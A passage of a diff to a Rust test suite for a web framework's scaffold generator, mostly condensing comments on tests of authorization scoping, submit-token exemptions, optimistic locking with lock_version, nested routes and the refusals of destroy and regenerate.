     fn no_owner_scaffold_authorizes_via_authenticated_policy_without_scoping_index() {
-        // Issue #1830: no-owner scaffolds now record-authorize their mutating
-        // handlers too (routing the mutation through the enforceable policy), and
-        // the generated no-owner policy authorizes any authenticated user — so a
-        // fresh scaffold never 403s out of the box. There is no owner column, so
-        // the index is NOT owner-scoped.
+        // The no-owner policy allows any authenticated user, so a fresh scaffold never 403s. With
+        // no owner column the index is not owner-scoped (#1830).
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -22568,8 +20310,7 @@ async fn main() {
             main.contains(".policy::<crate::models::post::Post, _>"),
             "{main}"
         );
-        // Mutating handlers are now inline-authorized (edit/update/destroy) and
-        // create runs authorize_create — routed through the enforceable policy.
+        // edit/update/destroy authorize inline; create runs `authorize_create`.
         let routes = action_contents(&plan, "src/routes/posts.rs");
         assert_eq!(
             routes
@@ -22583,7 +20324,6 @@ async fn main() {
                 .contains("autumn_web::authorization::authorize_create::<Post>(&state, &session)"),
             "no-owner create must authorize_create: {routes}"
         );
-        // But the index is NOT owner-scoped (no owner column to filter on).
         assert!(
             !routes.contains(".eq(owner_id)"),
             "no-owner index must not be owner-scoped: {routes}"
@@ -22663,7 +20403,6 @@ async fn main() {
             out.contains("exempt_paths = [\"/posts/validate\"]"),
             "{out}"
         );
-        // The original content is preserved.
         assert!(out.contains("[server]"), "{out}");
     }
 
@@ -22686,18 +20425,13 @@ async fn main() {
         assert!(out.contains("\"/webhooks/x\""), "{out}");
         assert!(out.contains("\"/posts/validate\""), "{out}");
         assert!(out.contains("ttl_secs = 900"), "{out}");
-        // No duplicate exempt_paths key.
         assert_eq!(out.matches("exempt_paths").count(), 1, "{out}");
     }
 
     #[test]
     fn submit_token_exempt_merges_into_commented_multiline_array() {
-        // A hand-edited, multiline `exempt_paths` array with item comments must
-        // merge into VALID TOML: the format-preserving edit inserts the new path
-        // as a real array element before the closing bracket, never splicing it
-        // after a `#` comment (which would produce e.g.
-        // `[..., # api, "/posts/validate"]` — invalid TOML that corrupts the
-        // config).
+        // The new path goes in as a real array element before `]`, never after a `#` comment, which
+        // would produce invalid TOML like `[..., # api, "/posts/validate"]`.
         let existing = "\
 [security.submit_token]
 exempt_paths = [
@@ -22707,10 +20441,8 @@ exempt_paths = [
 ";
         let out = append_submit_token_exempt_to_toml(existing, "posts", "validate")
             .expect("a new prefix must be merged into the commented array");
-        // The merged output is valid TOML.
         let parsed: toml::Value =
             toml::from_str(&out).unwrap_or_else(|e| panic!("merged TOML must parse: {e}\n{out}"));
-        // Both preexisting entries and the new prefix are present.
         let paths = parsed["security"]["submit_token"]["exempt_paths"]
             .as_array()
             .expect("exempt_paths must be an array");
@@ -22718,9 +20450,7 @@ exempt_paths = [
         assert!(values.contains(&"/api"), "{out}");
         assert!(values.contains(&"/webhooks/x"), "{out}");
         assert!(values.contains(&"/posts/validate"), "{out}");
-        // The item comment survives the edit.
         assert!(out.contains("# public api, never guarded"), "{out}");
-        // No duplicate exempt_paths key.
         assert_eq!(out.matches("exempt_paths").count(), 1, "{out}");
     }
 
@@ -22738,9 +20468,8 @@ exempt_paths = [
 
     #[test]
     fn submit_token_exempt_prefix_covers_only_validation_routes() {
-        // Field-name-agnostic: the exemption is a route prefix, independent of
-        // `security.submit_token.field_name`. It must cover the per-field
-        // validation routes but never the guarded create route.
+        // The exemption is a route prefix, independent of `security.submit_token.field_name`. It
+        // covers the per-field validation routes, never the create route.
         assert_eq!(
             submit_token_exempt_prefix("posts", "validate"),
             "/posts/validate"
@@ -22778,14 +20507,9 @@ exempt_paths = [
 
     #[test]
     fn live_validation_scaffold_exempts_validation_routes_in_autumn_toml() {
-        // End-to-end at plan level: a `--live-validation` scaffold with a
-        // CUSTOM submit-token field name still exempts the generated
-        // `/posts/validate/*` routes, because the exemption is route-based
-        // (field-name-agnostic) rather than relying on the `hx-params` filter,
-        // which only strips the default `_submit_token` name.
+        // The exemption is route-based, so it holds under a custom submit-token field name; the
+        // `hx-params` filter only strips the default `_submit_token`.
         let tmp = project_with_main(default_main());
-        // A customised field name in autumn.toml — the exemption must not depend
-        // on it.
         fs::write(
             tmp.path().join("autumn.toml"),
             "[security.submit_token]\nfield_name = \"_confirm\"\n",
@@ -22818,7 +20542,6 @@ exempt_paths = [
             toml_action.contains("\"/posts/validate\""),
             "autumn.toml must exempt the validation route prefix:\n{toml_action}"
         );
-        // The custom field name is left untouched.
         assert!(
             toml_action.contains("field_name = \"_confirm\""),
             "{toml_action}"
@@ -22899,10 +20622,8 @@ exempt_paths = [
         let tmp = project_with_main(default_main());
         let plan = richtext_scaffold_plan(&tmp);
         let routes = action_contents(&plan, "src/routes/posts.rs");
-        // The index column renders the raw source through maud's escaping
-        // `Render` impl — a table cell must not carry block-level markup, and
-        // escaped text is inherently safe.
-        // `let mut columns:` since issue #1312 prepends the bulk-select column.
+        // Index cells render the source as escaped text: a table cell must not carry block-level
+        // markup. `columns: Vec<` also matches `let mut columns:` (bulk-select column, #1312).
         let columns = routes
             .split_once("columns: Vec<")
             .expect("index columns block")
@@ -22925,7 +20646,6 @@ exempt_paths = [
              preview:\n{routes}"
         );
         assert!(routes.contains("pub async fn preview_body("), "{routes}");
-        // The preview handler renders through the same sanitizer.
         let handler = routes
             .split_once("pub async fn preview_body(")
             .unwrap()
@@ -22943,10 +20663,9 @@ exempt_paths = [
 
     #[test]
     fn non_nullable_richtext_gets_a_required_signal() {
-        // PR #2157 review: every other non-nullable generated control carries
-        // `required`/`aria-required`. A `body:richtext` column had neither, and
-        // since `String` and `TEXT NOT NULL` both accept `""`, an empty editor
-        // persisted a blank body.
+        // A non-nullable richtext needs `required`/`aria-required` like every other control:
+        // `String` and `TEXT NOT NULL` both accept `""`, so an empty editor would save a blank
+        // body.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -22972,11 +20691,9 @@ exempt_paths = [
 
     #[test]
     fn richtext_preview_does_not_depend_on_the_rest_of_the_form_decoding() {
-        // PR #2157 review: the preview `hx-include`s the whole form, so on a
-        // fresh "new" page every other field is still blank. Decoding the whole
-        // form struct to reach the one previewed field would fail on the first
-        // strictly-typed empty column (`count=` into an `i64`) and blank the
-        // preview until every unrelated field was filled in.
+        // The preview `hx-include`s the whole form. Decoding the full form struct would fail on any
+        // blank typed field (`count=` into an `i64`) and blank the preview until every field is
+        // filled.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -23051,10 +20768,8 @@ exempt_paths = [
 
     #[test]
     fn defaulted_richtext_column_mounts_no_preview_route() {
-        // A `--default`ed column is dropped from the form, so the routes module
-        // emits no `preview_{field}` handler for it. Mounting one anyway in
-        // `main.rs` fails the generated app to compile with `cannot find value
-        // preview_body in module routes::posts`.
+        // A `--default`ed column has no form field and no `preview_{field}` handler, so mounting
+        // one in `main.rs` would not compile.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold_with_options(
             tmp.path(),
@@ -23087,10 +20802,8 @@ exempt_paths = [
 
     #[test]
     fn api_richtext_scaffold_skips_the_html_only_wiring() {
-        // `--api` renders no form and no show view, so a richtext column is
-        // just a TEXT column carrying Markdown source out over JSON. Pulling in
-        // the `markdown` feature (and exempting a preview route that is never
-        // generated) would be dead weight.
+        // `--api` has no form or show view, so the `markdown` feature and the preview exemption
+        // would be dead weight.
         let tmp = project_with_main(default_main());
         fs::write(
             tmp.path().join("Cargo.toml"),
@@ -23154,9 +20867,8 @@ exempt_paths = [
 
     #[test]
     fn live_validation_scaffold_records_revert_only_when_exemption_inserted() {
-        // Absent exemption: the scaffold both modifies autumn.toml AND records a
-        // `SubmitTokenValidateExempt` revert so `autumn destroy` cleans up the
-        // entry it added.
+        // With no existing exemption, the scaffold adds one and records a
+        // `SubmitTokenValidateExempt` revert so `autumn destroy` removes it.
         let tmp = project_with_main(default_main());
         fs::write(
             tmp.path().join("autumn.toml"),
@@ -23197,11 +20909,8 @@ exempt_paths = [
 
     #[test]
     fn live_validation_scaffold_skips_revert_when_exemption_preexists() {
-        // The exemption is ALREADY present (e.g. a user hand-added it, possibly
-        // with a custom field name). The scaffold must NOT modify autumn.toml and
-        // must NOT record a revert — otherwise a later `autumn destroy` would
-        // delete a user-owned entry, re-enabling submit-token guarding on the
-        // live-validation routes.
+        // The exemption already exists (hand-added). Leave autumn.toml alone and record no revert,
+        // or `autumn destroy` would delete a user-owned entry and re-guard the validation routes.
         let tmp = project_with_main(default_main());
         fs::write(
             tmp.path().join("autumn.toml"),
@@ -23658,8 +21367,7 @@ exempt_paths = [
 
     fn lock_plan(options: &ScaffoldOptions) -> Result<Plan, GenerateError> {
         let tmp = project_with_main(default_main());
-        // The TempDir must outlive the plan's file reads, which all happen
-        // during planning — `action_contents` reads from the in-memory plan.
+        // Planning reads every file up front, so `tmp` can drop before the caller reads the plan.
         let plan = plan_scaffold_with_options(
             tmp.path(),
             "Post",
@@ -23687,8 +21395,7 @@ exempt_paths = [
 
     #[test]
     fn lock_version_edit_form_renders_hidden_version_input() {
-        // AC 1: the edit form carries the row's current `lock_version` as a
-        // hidden input so the submit says which version the user was editing.
+        // The edit form sends back the version the user was editing.
         let routes = lock_routes();
         assert!(
             routes.contains("name=\"lock_version\""),
@@ -23709,9 +21416,8 @@ exempt_paths = [
 
     #[test]
     fn lock_version_is_excluded_from_the_editable_form_struct() {
-        // The version is machinery, not content: it must not surface as a
-        // "Lock version" text box, and it must not be settable from user input
-        // through the ordinary column path.
+        // The version must not render as a text box or be settable through the ordinary column
+        // path.
         let routes = lock_routes();
         assert!(
             !routes.contains("pub lock_version: i32,\n}"),
@@ -23725,9 +21431,8 @@ exempt_paths = [
 
     #[test]
     fn lock_version_update_guards_the_write_and_bumps_the_version() {
-        // AC 2 + AC 4: the UPDATE carries a `WHERE lock_version = $expected`
-        // guard and increments the column in the same statement, so the check
-        // and the bump are atomic.
+        // One UPDATE checks `lock_version = $expected` and bumps it, so the check and the bump are
+        // atomic.
         let routes = lock_routes();
         let update = handler_slice(&routes, "update");
         assert!(
@@ -23746,12 +21451,9 @@ exempt_paths = [
 
     #[test]
     fn lock_version_parser_survives_a_colliding_security_field_name() {
-        // The CSRF and submit-token field names are app-configurable, so an app
-        // may legitimately name one of them `lock_version` — and those hidden
-        // inputs are prepended, landing in the body BEFORE the real version.
-        // Taking the first `lock_version` pair would read a UUID, fail to parse
-        // it, and 400 every update. The parser scans for the first pair that
-        // parses instead.
+        // An app may name its CSRF or submit-token field `lock_version`, and those inputs come
+        // first in the body. Taking the first pair would parse a UUID and 400 every update, so the
+        // parser takes the first pair that parses.
         let routes = lock_routes();
         assert!(
             routes.contains(".filter(|(key, _)| key == \"lock_version\")")
@@ -23766,9 +21468,8 @@ exempt_paths = [
 
     #[test]
     fn lock_version_conflict_rerenders_the_edit_form_at_409() {
-        // AC 3: a stale submit is not a dead-end error page — it re-renders the
-        // edit form at 409 with the submitted values and an inline banner, and
-        // it is distinguished from a genuinely missing row (404).
+        // A stale submit re-renders the edit form at 409 with the submitted values and a banner,
+        // distinct from a missing row (404).
         let routes = lock_routes();
         let update = handler_slice(&routes, "update");
         assert!(
@@ -23795,12 +21496,9 @@ exempt_paths = [
 
     #[test]
     fn a_re_read_row_is_re_authorized_before_it_is_used() {
-        // Both guarded writes re-read the row when they match zero. The policy
-        // check earlier in each handler ran against the snapshot that request
-        // loaded — and a record policy can depend on mutable row data (the
-        // generated owner policy does), so the very write that moved the version
-        // may also have moved the row out of this actor's reach. Rendering or
-        // reading the re-read row unchecked would leak it.
+        // Both guarded writes re-read the row when they match zero. The earlier policy check saw
+        // the stale snapshot, and a record policy can depend on mutable row data (the owner policy
+        // does), so the re-read row must be re-authorized before it is rendered or read.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -23836,8 +21534,7 @@ exempt_paths = [
             "the check must come BEFORE the render: {transition}"
         );
 
-        // The update path only carries the version integer across, but re-checks
-        // for the same reason rather than arguing about how sensitive it is.
+        // The update path only carries the version across, but re-checks for the same reason.
         let update = handler_slice(&routes, "update");
         let uconflict = update
             .find("if updated == 0")
@@ -23877,10 +21574,8 @@ exempt_paths = [
 
     #[test]
     fn lock_version_conflict_rerender_carries_the_fresh_version() {
-        // Re-rendering with the STALE version would make the form unsavable
-        // forever: the user would resubmit the same losing version and conflict
-        // again. The 409 body carries the row's current version so a second
-        // Save applies the user's values on top of the newer row.
+        // Re-rendering with the stale version would conflict forever. The 409 carries the current
+        // version, so a second Save applies the user's values on top of the newer row.
         let routes = lock_routes();
         let update = handler_slice(&routes, "update");
         assert!(
@@ -23891,9 +21586,8 @@ exempt_paths = [
 
     #[test]
     fn lock_version_scaffold_emits_a_stale_write_smoke_test() {
-        // AC 6: the generated suite proves the contract — a stale submit yields
-        // a 409 re-render and leaves the row untouched; a fresh submit succeeds
-        // and bumps the version.
+        // The generated suite checks that a stale submit gets a 409 and leaves the row untouched,
+        // and a fresh submit succeeds and bumps the version.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold_with_options(
             tmp.path(),
@@ -23920,7 +21614,6 @@ exempt_paths = [
 
     #[test]
     fn scaffold_without_lock_version_carries_no_locking_artifacts() {
-        // AC 5: zero behavior change for the overwhelming common case.
         let routes = bulk_routes_default();
         for needle in [
             "lock_version",
@@ -23950,10 +21643,8 @@ exempt_paths = [
 
     #[test]
     fn lock_version_is_refused_on_variants_whose_update_path_is_not_wired() {
-        // `--live`/`--sharded` write through the repository extractor and the
-        // attachment path writes after a multipart save; neither routes through
-        // the guarded statement, so generating them would emit silently lossy
-        // code. Refuse up front instead (same posture as the `slug` gates).
+        // `--live`/`--sharded` write through the repository extractor and attachments write after a
+        // multipart save. None use the guarded statement, so the lock would be silently ignored.
         for (label, options) in [
             (
                 "--live",
@@ -23985,12 +21676,9 @@ exempt_paths = [
 
     #[test]
     fn api_scaffolds_are_exempt_from_every_variant_gate() {
-        // `--api` emits no routes file, so none of the HTML-surface variants
-        // can be inconsistent with a guarded update that does not exist. These
-        // combinations generated fine before #1318 and must keep doing so; the
-        // model attribute still lands, which is what conflict-checks the JSON
-        // update. (`--api` is NOT exempt from the empty-insert-struct guard —
-        // that one is about `New{Model}`, which every variant emits.)
+        // `--api` emits no routes file, so no HTML variant can disagree with the guarded update;
+        // the model attribute still conflict-checks the JSON update. `--api` still gets the
+        // empty-insert-struct guard, since every variant emits `New{Model}`.
         for (label, cols, options) in [
             (
                 "--api --live",
@@ -24040,10 +21728,9 @@ exempt_paths = [
 
     #[test]
     fn destroying_a_legacy_lock_version_scaffold_is_never_blocked_by_the_new_gates() {
-        // A scaffold generated before these refusals existed must stay
-        // removable. `destroy` recomputes the plan it is about to revert, so a
-        // refusal here lands BEFORE `Plan::revert` sees `--force` — stranding
-        // exactly the files the user asked to delete, with no way out.
+        // A scaffold generated before these refusals must stay removable. `destroy` recomputes the
+        // plan, so a refusal here would fire before `Plan::revert` sees `--force` and strand the
+        // files.
         for (label, cols, options) in [
             (
                 "--live",
@@ -24102,11 +21789,8 @@ exempt_paths = [
 
     #[test]
     fn lock_version_is_refused_alongside_a_slug_column() {
-        // A slug scaffold keys `update` off the slug, not the primary key, so
-        // `WHERE slug = ... AND lock_version = ...` does not identify a stable
-        // row: rename a slug, let a new row (version 0) claim the freed value,
-        // and a stale submit would commit over that unrelated record while
-        // reporting success. Refuse the pair rather than ship the swap.
+        // A slug scaffold updates by slug. Rename a slug, let a new row (version 0) claim the old
+        // value, and a stale submit would overwrite that unrelated row and report success.
         let tmp = project_with_main(default_main());
         let err = plan_scaffold(
             tmp.path(),
@@ -24128,10 +21812,9 @@ exempt_paths = [
 
     #[test]
     fn lock_version_scaffold_with_no_insertable_columns_is_refused() {
-        // Counting declared tokens would miss this: two columns are declared,
-        // but `--default` drops `title` from the insert struct and
-        // `#[lock_version]` drops the version, leaving `NewPost` empty — which
-        // does not implement `Insertable` and would not compile.
+        // Two columns are declared, but `--default` drops `title` and `#[lock_version]` drops the
+        // version, leaving `NewPost` empty and not `Insertable`. Counting declared columns would
+        // miss it.
         let tmp = project_with_main(default_main());
         let err = plan_scaffold_with_options(
             tmp.path(),
@@ -24156,9 +21839,8 @@ exempt_paths = [
 
     #[test]
     fn lock_version_cannot_be_the_only_column() {
-        // The column is DB-managed, so it contributes no form field — a
-        // scaffold declaring only `lock_version` would emit an empty
-        // `NewPost`, which is not `Insertable` and does not compile.
+        // The column is DB-managed, so a scaffold of only `lock_version` would emit an empty
+        // `NewPost`, which is not `Insertable`.
         let tmp = project_with_main(default_main());
         let err = plan_scaffold(
             tmp.path(),
@@ -24176,11 +21858,9 @@ exempt_paths = [
 
     #[test]
     fn state_transition_is_a_compare_and_swap_on_the_version() {
-        // A transition is a read-modify-write: it loads the row, checks the edge
-        // is legal from the state it read, then writes. Without a guard, two
-        // concurrent transitions out of the same source state both pass the
-        // check and both commit — the second silently overwriting the first.
-        // The bump alone does not prevent that; the WHERE does.
+        // A transition loads the row, checks the edge from the state it read, then writes. Without
+        // the version in the WHERE, two concurrent transitions out of one state both pass and the
+        // second overwrites the first.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -24207,10 +21887,8 @@ exempt_paths = [
             transition.contains("changed by someone else"),
             "the 409 must explain itself: {transition}"
         );
-        // Zero rows is ambiguous: the version moved, or the row was deleted
-        // between the load and the write. The transition path re-reads to tell
-        // them apart, exactly as `update` does — otherwise a concurrent delete
-        // renders a conflict page for a row that can no longer be reloaded.
+        // Zero rows means the version moved or the row was deleted. Re-read to tell them apart, as
+        // `update` does, so a concurrent delete 404s.
         assert!(
             transition.contains(".optional()?") && transition.contains("not_found_msg"),
             "a concurrent delete must 404, not 409: {transition}"
@@ -24225,9 +21903,8 @@ exempt_paths = [
 
     #[test]
     fn state_transition_bumps_the_lock_version() {
-        // The bump is the other half: it makes the transition visible to anyone
-        // else guarding on the version, so an author whose edit form predates
-        // the transition is told the record moved on instead of saving over it.
+        // The bump makes the transition visible to version guards, so an edit form that predates it
+        // gets a conflict instead of saving over it.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -24385,14 +22062,9 @@ exempt_paths = [
             model.contains("#[belongs_to(Post, counter_cache)]"),
             "the child model must carry the attribute that drives the maintenance: {model}"
         );
-        // Issue #2431: a substring check alone let a build-breaking ordering
-        // bug ship — `#[belongs_to(...)]` is a helper attribute that only
-        // `#[autumn_web::model]`'s own expansion understands, so rustc
-        // accepts it only BELOW `#[model]`; emitted above, `cargo check`
-        // fails with `cannot find attribute belongs_to in this scope` on
-        // every real scaffold (which always has at least a blank line
-        // between the doc header and `#[model]`, unlike this test's old
-        // bare fixture).
+        // `#[belongs_to(...)]` is a helper attribute only `#[autumn_web::model]`'s expansion
+        // understands, so it must sit below `#[model]`; above it, `cargo check` fails with
+        // `cannot find attribute belongs_to` (#2431). A substring check alone misses the order.
         let model_pos = model
             .find("#[autumn_web::model]")
             .expect("model attribute present");
@@ -24420,12 +22092,9 @@ exempt_paths = [
 
     #[test]
     fn counter_cache_survives_a_force_regeneration_without_stacking_attributes_or_imports() {
-        // `--counter-cache` is typed once; a later `generate … --force` (e.g.
-        // after adding a field) is the ordinary way it gets repeated, and must
-        // not stack a second `#[belongs_to]` or duplicate `use` line onto the
-        // freshly-rendered model. The parent-side warning is generate-only
-        // (never persisted anywhere the scaffold could read back), so it must
-        // still be surfaced on every run, not just the first.
+        // `--counter-cache` is typed once; a later `generate … --force` must not stack a second
+        // `#[belongs_to]` or `use` onto the model. The parent-side warning is not persisted, so it
+        // must appear on every run.
         let tmp = project_with_scaffolded_parent();
         counter_cached_comment_plan(&tmp)
             .execute(Flags::default())
@@ -24497,11 +22166,9 @@ exempt_paths = [
 
     #[test]
     fn the_counter_migration_is_on_the_revert_plan_too() {
-        // `Plan::revert` discovers removable migration directories from the
-        // plan's `Create` actions under `migrations/`, so a revert plan that
-        // omitted these would leave the counter migration on disk after
-        // `autumn destroy scaffold` — and a later `migrate` run would then add a
-        // column to a parent whose child scaffold is gone.
+        // `Plan::revert` finds removable migration directories from the plan's `Create` actions.
+        // Without these, `autumn destroy scaffold` would leave the counter migration to add a
+        // column to the parent on the next `migrate`.
         let tmp = project_with_scaffolded_parent();
         let plan = plan_scaffold_with_options_for_revert(
             tmp.path(),
@@ -24872,11 +22539,9 @@ exempt_paths = [
 
     #[test]
     fn belongs_to_composes_with_the_other_form_helper_flags() {
-        // The shared `{snake}_form_for` helper grows one extra parameter per
-        // opt-in feature, and every call site must pass them in DECLARATION
-        // order. `lock_version` (#1318) and `exclude_parent_fk` (#1323) are both
-        // trailing flags, so getting the order wrong compiles the generator but
-        // emits a child module that does not — exactly the break this pins.
+        // `{snake}_form_for` grows one trailing parameter per opt-in feature (`lock_version`,
+        // `exclude_parent_fk`). Passing them out of order still compiles the generator but emits a
+        // child module that does not compile.
         let tmp = project_with_scaffolded_parent();
         let plan = plan_scaffold_with_options(
             tmp.path(),
@@ -24911,10 +22576,8 @@ exempt_paths = [
 
     #[test]
     fn belongs_to_scopes_the_nested_list_like_the_flat_index() {
-        // A child with an owner column gets an owner-scoped, `#[secured]` flat
-        // index. The nested list is a SECOND listing surface onto the same rows,
-        // so it must carry the same scoping — otherwise `--belongs-to` would
-        // quietly open an unauthenticated door onto other users' children.
+        // The nested list shows the same rows as the owner-scoped, `#[secured]` flat index, so it
+        // needs the same scoping or it leaks other users' children.
         let tmp = project_with_scaffolded_parent();
         let plan = plan_scaffold_with_options(
             tmp.path(),
@@ -24952,10 +22615,9 @@ exempt_paths = [
 
     #[test]
     fn belongs_to_refuses_a_sharded_parent() {
-        // The child's own `--sharded` is refused elsewhere; this is the other
-        // side of the relationship, which the child's flags cannot see. A
-        // sharded parent holds a `ShardedDb`, which will not coerce to the
-        // `&mut Db` the injected `children_section` call borrows.
+        // The child's flags cannot see that its parent is sharded. A sharded parent holds a
+        // `ShardedDb`, which will not coerce to the `&mut Db` the injected `children_section` call
+        // borrows.
         let tmp = project_with_main(default_main());
         let parent = plan_scaffold_with_options(
             tmp.path(),
@@ -25047,9 +22709,8 @@ exempt_paths = [
 
     #[test]
     fn destroy_unmounts_nested_routes_even_without_the_belongs_to_flag() {
-        // `--belongs-to` is something the author typed once, days ago. Omitting
-        // it on `destroy` must not leave `main.rs` mounting handlers whose
-        // module this destroy just deleted — an uncompilable project.
+        // `--belongs-to` is typed once. Omitting it on `destroy` must not leave `main.rs` mounting
+        // handlers from the deleted module.
         temp_env::with_vars(
             [
                 ("AUTUMN_DATABASE__PRIMARY_URL", None::<&str>),
@@ -25095,10 +22756,8 @@ exempt_paths = [
 
     #[test]
     fn regenerating_without_the_flag_keeps_an_existing_nesting_intact() {
-        // `--belongs-to` is typed once. A later `generate … --force` (the
-        // ordinary "I changed a field" move) rarely repeats it — and the three
-        // artefacts must not disagree: the child module, the `main.rs` mounts,
-        // and the parent's `children_section` call.
+        // A later `generate … --force` rarely repeats `--belongs-to`, and the child module, the
+        // `main.rs` mounts and the parent's `children_section` call must still agree.
         let tmp = project_with_scaffolded_parent();
         nested_comment_plan(&tmp).execute(Flags::default()).unwrap();
 
@@ -25132,11 +22791,9 @@ exempt_paths = [
 
     #[test]
     fn regenerating_after_dropping_the_foreign_key_is_refused_before_anything_is_written() {
-        // Nothing to nest on any more, so there is no relationship to recover —
-        // and the parent's `children_section` call would be left pointing at a
-        // helper the regenerated module no longer defines. A warning is not
-        // enough: the command would report success on an app that no longer
-        // compiles. Refuse instead, having written nothing.
+        // With the FK gone, the parent's `children_section` call would point at a helper the
+        // regenerated module no longer defines. A warning would report success on an app that does
+        // not compile, so refuse before writing anything.
         let tmp = project_with_scaffolded_parent();
         nested_comment_plan(&tmp).execute(Flags::default()).unwrap();
         let parent_before = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
@@ -25162,10 +22819,9 @@ exempt_paths = [
 
     #[test]
     fn re_parenting_an_already_nested_resource_is_refused() {
-        // The nastiest shape: it COMPILES. `posts.rs` keeps calling
-        // `children_section(&mut db, row.id, …)`, but the regenerated helper now
-        // filters on `user_id` — so Post #3's page would list User #3's comments
-        // and its inline form would create rows owned by that user.
+        // This one compiles: `posts.rs` keeps calling `children_section(&mut db, row.id, …)`, but
+        // the regenerated helper filters on `user_id`, so Post #3's page would list User #3's
+        // comments and its inline form would create rows owned by that user.
         let tmp = project_with_scaffolded_parent();
         // A second scaffolded parent to re-point at.
         plan_scaffold(
@@ -25221,12 +22877,10 @@ exempt_paths = [
 
     #[test]
     fn regenerating_the_parent_keeps_the_children_section_it_carries() {
-        // `Post` is not a child, so its plan has no `Nesting` and the flat
-        // template it re-renders knows nothing about comments. Without the
-        // re-apply, a `--force` on the parent would silently drop the children
-        // list and the markers — after which a later child regeneration, having
-        // no markers to read, would emit no nested handlers while `main.rs`
-        // still mounted them.
+        // `Post`'s plan has no `Nesting`, so its re-rendered template knows nothing about comments.
+        // Without the re-apply, `--force` on the parent drops the children list and markers, and a
+        // later child regeneration finds no markers and emits no nested handlers while `main.rs`
+        // still mounts them.
         let tmp = project_with_scaffolded_parent();
         nested_comment_plan(&tmp).execute(Flags::default()).unwrap();
 
@@ -25251,11 +22905,9 @@ exempt_paths = [
 
     #[test]
     fn destroying_a_parent_that_still_has_nested_children_is_refused() {
-        // Deleting posts.rs and schema::posts out from under comments.rs — which
-        // imports both — leaves the project uncompilable with the nested routes
-        // still mounted. The plain divergence check stops the default destroy by
-        // accident, but says nothing about children and `--force` waves it
-        // through, so refuse explicitly.
+        // Deleting posts.rs and schema::posts breaks comments.rs, which imports both, while the
+        // nested routes stay mounted. The divergence check stops the default destroy only by
+        // accident and `--force` skips it, so refuse explicitly.
         let tmp = project_with_scaffolded_parent();
         nested_comment_plan(&tmp).execute(Flags::default()).unwrap();
 
@@ -25286,11 +22938,9 @@ exempt_paths = [
 
     #[test]
     fn regenerating_a_nested_parent_into_an_incompatible_variant_is_refused() {
-        // "The marker landed" is not the test: a `--sharded` parent's `show`
-        // takes the injection perfectly cleanly and then fails to compile,
-        // because `children_section` borrows `&mut Db` and the handler now holds
-        // a `ShardedDb`. The parent's own regeneration runs none of the
-        // preflights `resolve` does for a child, so it checks them here.
+        // A marker landing is not enough: a `--sharded` parent's `show` takes the injection, then
+        // fails to compile because `children_section` borrows `&mut Db`. The parent's regeneration
+        // runs none of the child's `resolve` preflights, so it checks them here.
         let tmp = project_with_scaffolded_parent();
         nested_comment_plan(&tmp).execute(Flags::default()).unwrap();
         let before = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
@@ -25321,11 +22971,9 @@ exempt_paths = [
 
     #[test]
     fn the_injected_show_carries_the_lint_allowance_its_extra_extractors_need() {
-        // A generated project's own CI runs `cargo clippy --all-targets -- -D
-        // warnings`. Every standard `show` already takes three parameters, so
-        // six extractors trip `too_many_arguments` (9/7) — `cargo check` passes,
-        // which is why this stayed invisible. The allowance is reversible: it
-        // carries the extractors marker and comes off with them.
+        // Generated projects run `cargo clippy --all-targets -- -D warnings`. `show` already takes
+        // three parameters, so six more trip `too_many_arguments`, which `cargo check` does not
+        // report. The allowance carries the extractors marker and comes off with them.
         let tmp = project_with_scaffolded_parent();
         let plan = nested_comment_plan(&tmp);
         let parent = action_contents(&plan, "src/routes/posts.rs");
@@ -25394,8 +23042,7 @@ exempt_paths = [
         let plan =
             plan_scaffold_with_options(tmp.path(), "Post", &fields, "20260427000000", options)
                 .unwrap();
-        // Keep the tempdir alive for the duration of the plan's construction
-        // only — every assertion below reads the in-memory action contents.
+        // Planning reads every file up front; the assertions read the in-memory action contents.
         drop(tmp);
         plan
     }
@@ -25488,15 +23135,14 @@ exempt_paths = [
             trash.contains("csrf: Option<CsrfToken>"),
             "the trash handler must extract a CSRF token for its row forms:\n{trash}"
         );
-        // Issue #1706: a submit control is emitted through the typed `a11y`
-        // primitive, whose constructor requires an accessible name.
+        // Submit controls go through the typed `a11y` button, whose constructor requires an
+        // accessible name (#1706).
         assert!(
             trash.contains("autumn_web::a11y::Button::new(\"Restore\").submit()"),
             "Restore must render through the a11y Button primitive:\n{trash}"
         );
-        // The confirm dialog is titled per row: one dialog per row means
-        // identical titles would stack indistinguishable headings in the outline
-        // and never tell the user WHICH row they are about to destroy.
+        // One confirm dialog per row, so each title names its row; identical titles would stack
+        // indistinguishable headings and never say which row is destroyed.
         assert!(
             trash.contains("format!(\"Permanently delete post {}?\", row.id)"),
             "the purge dialog must name the row it destroys:\n{trash}"
@@ -25666,9 +23312,8 @@ exempt_paths = [
                 &[],
             ),
             ("--sharded", trash_options(|o| o.model.sharded = true), &[]),
-            // An owner-scoped index has no owner-filtered deleted-rows scope to
-            // list through, and re-deriving the owner filter by hand in a second
-            // handler is exactly how a list endpoint leaks another user's rows.
+            // There is no owner-filtered deleted-rows scope, and re-deriving the owner filter in a
+            // second handler is how a list endpoint leaks other users' rows.
             ("owner-scoped", trash_options(|_| {}), &["user:references"]),
         ];
         for (label, options, extra_fields) in cases {
@@ -25704,10 +23349,8 @@ exempt_paths = [
             }),
             ("soft_delete", |o| o.model.soft_delete = true),
         ];
-        // Guard against the loop degenerating into a no-op: if a future planner
-        // change starts refusing most of the matrix (or the `else { continue }`
-        // below starts swallowing everything), the counters catch it rather than
-        // letting a green test cover nothing.
+        // The counters catch the loop degenerating into a no-op if the planner starts refusing most
+        // of the matrix.
         let mut planned = 0usize;
         let mut with_trash = 0usize;
         // Every subset of the toggles, crossed with "does the model carry an
@@ -25725,10 +23368,8 @@ exempt_paths = [
                 if owner {
                     label.push("owner");
                 }
-                // `--searchable` on an owner-scoped `--sharded` scaffold is
-                // refused outright (issue #1841), as is `--live` + searchable
